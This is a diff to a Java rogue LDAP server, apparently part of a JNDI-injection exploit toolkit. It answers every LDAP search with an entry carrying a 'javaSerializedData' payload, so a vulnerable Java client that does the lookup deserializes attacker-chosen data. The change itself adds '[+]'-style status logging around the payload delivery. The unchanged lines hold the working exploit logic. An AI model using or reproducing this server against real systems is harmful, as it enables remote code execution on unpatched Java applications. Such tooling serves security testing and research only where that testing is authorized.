@@ -27,9 +27,11 @@ public class LDAPServer {
                     (SSLSocketFactory) SSLSocketFactory.getDefault()));
             config.addInMemoryOperationInterceptor(new OperationInterceptor(serializedData));
             InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
-            System.out.println("Listening on 0.0.0.0:" + port);
+            System.out.println("[+] LDAP Server starting...");
+            System.out.println("[+] Listening on 0.0.0.0:" + port);
             ds.startListening();
         } catch (Exception e) {
+            System.err.println("[-] LDAP Server startup failed:");
             e.printStackTrace();
         }
     }
@@ -44,22 +46,25 @@ public class LDAPServer {
         @Override
         public void processSearchResult(InMemoryInterceptedSearchResult result) {
             String base = result.getRequest().getBaseDN();
-            System.out.println(base);
+            System.out.println("[+] Received LDAP search request for: " + base);
             Entry e = new Entry(base);
             try {
                 sendResult(result, base, e);
             } catch (Exception e1) {
+                System.err.println("[-] Error processing search result:");
                 e1.printStackTrace();
             }
-
         }
 
         protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
+            System.out.println("[+] Preparing LDAP response...");
             e.addAttribute("javaClassName", "foo");
-            e.addAttribute("javaSerializedData",serializedData);
-
+            e.addAttribute("javaSerializedData", serializedData);
+            
+            System.out.println("[+] Sending LDAP response with payload");
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+            System.out.println("[+] LDAP response sent successfully");
         }
     }
 }
